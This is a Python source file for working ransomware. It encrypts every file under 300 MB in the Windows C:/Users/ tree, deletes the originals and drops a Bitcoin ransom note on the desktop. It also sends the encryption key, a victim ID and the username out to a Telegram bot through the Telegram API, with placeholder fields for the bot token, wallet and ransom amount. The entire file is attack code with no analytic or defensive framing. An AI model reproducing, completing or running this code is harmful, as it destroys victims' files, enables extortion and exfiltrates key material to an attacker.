import os
import string
import random
import requests
import sys
import threading
import errno
from datetime import datetime
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher_key = Fernet(key)


class Config:
    def __init__(self):
        self.api = 'YOUR_API'
        self.chat_id = 'YOUR_CHAT_ID'
        self.ransomware = True
        self.ransomware_email_address = 'THANK@YOU.COM'
        self.ransomware_btc_wallet_adress = "YOUR_BTC_ADDRESS"
        self.ransomware_amount_of_money = "AMOUNT OF MONEY"
    
    def get_ransomware(self):
        return self.ransomware
    
    def get_ransomeware_email_address(self):
        return self.ransomware_email_address

    def get_ransomware_amount_of_money(self):
        return self.ransomware_amount_of_money

    def get_ransomware_btc_wallet_adress(self):
        return self.ransomware_btc_wallet_adress

cc = Config()

def get_random_string(length):
    letters = string.digits
    result_str = "".join(random.choice(letters) for i in range(length))
    return result_str
    
ID_VICTIM = get_random_string(7)
timestamp = datetime.now().astimezone()
encryptedfiles = []
target_directory = r"C:/Users/"


message_to_boss = f"""APT - RANSOMEWARE
Time: {timestamp}
ID VICTIM: {ID_VICTIM}
UserName: {os.getlogin()}
Key: {key}
"""
message_to_victim = f"""
Your computer is now infected with ransomware. Your file are encrypted with a secure algorithm that is impossible to crack.

To recover your files you need a key. This key is generated once your file have been encrypted. To obtain the key, you must purchase it.

You can do this by sending {cc.get_ransomware_amount_of_money()} BTC to this BTC address:
{cc.get_ransomware_btc_wallet_adress()}


Once you have sent the ransom to the btc address you must write an email this this email address: {cc.get_ransomeware_email_address()}

In this email you will include your personal ID so we know who you are. Your personal ID is: {ID_VICTIM}

Once you have completeted all of the steps, you will be provided with the key to decrypt your files.


Note: Messing with the ransomware will simply make your files harder to decrypt. Deleting the webhook will make it impossible, as the key can not be generated.

Good luck
"""

def send_wh():
    url = f"https://api.telegram.org/bot{cc.api}/sendMessage"
    params = {'chat_id': cc.chat_id, 'text': message_to_boss}
    
    try:
        response = requests.post(url, params=params)
        if response.status_code != 200:
            sys.exit(1)
    except Exception:
        pass
    
def log_error(e):
    url = f"https://api.telegram.org/bot{cc.api}/sendMessage"
    params = {'chat_id': cc.chat_id, 'text': e}
    
    try:
        response = requests.post(url, params=params)
    except Exception:
        pass

def check_file(file_path):
    file_size_byte = os.path.getsize(file_path)
    file_size_mb = round(file_size_byte /(1024**2), 4)
    return file_size_mb < 300
    
def encrypt_file(file_path):
    encryptedfiles.append(file_path)

    if check_file(file_path):
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
                encrypted_data = cipher_key.encrypt(file_data)

            encrypted_file_path = file_path + '.apt3233.encrypted'

            with open(encrypted_file_path, 'wb') as file:
                file.write(encrypted_data)
                
            os.remove(file_path)
        except:pass

def is_encrypted(file_path):
    enc_file_path = file_path + '.apt3233.encrypted'
    return os.path.exists(enc_file_path)

def encrypt_directory(dir_path):
    for root, dir, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)

            try:
                if not is_encrypted(file_path):
                    encrypt_file(file_path)
            except OSError as e:
                if e.errno in (errno.EACCES, errno.EPERM, errno.EINVAL, errno.ENOENT, errno.ENOTDIR, errno.ENAMETOOLONG, errno.EROFS):
                    pass
            except Exception as e:
                if isinstance(e,(
                                  FileNotFoundError,
                                  IsADirectoryError,
                                  TimeoutError
                              )):
                    pass
                else:
                    log_error(e)

def encrypted_files():
    try:
        with open("APT3233-RANSOMEWARE-LISTFILE.txt", "w") as file:
            for encryptedfile in encryptedfiles:
                file.write(encryptedfile + "\n")
    except:
        pass

def ransomeware():
    send_wh()
    encrypt_directory(target_directory)
    encrypted_files()

    desktop = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
    file_path = os.path.join(desktop, "APT3233-RANSOMEWARE-NOTE.txt")
    with open(file_path, 'w') as file:
        file.write(message_to_victim)
    
    os.startfile(file_path)

if cc.get_ransomware():
    try:
        threading.Thread(target=ransomeware()).start()
    except Exception as e:
        log_error(e)
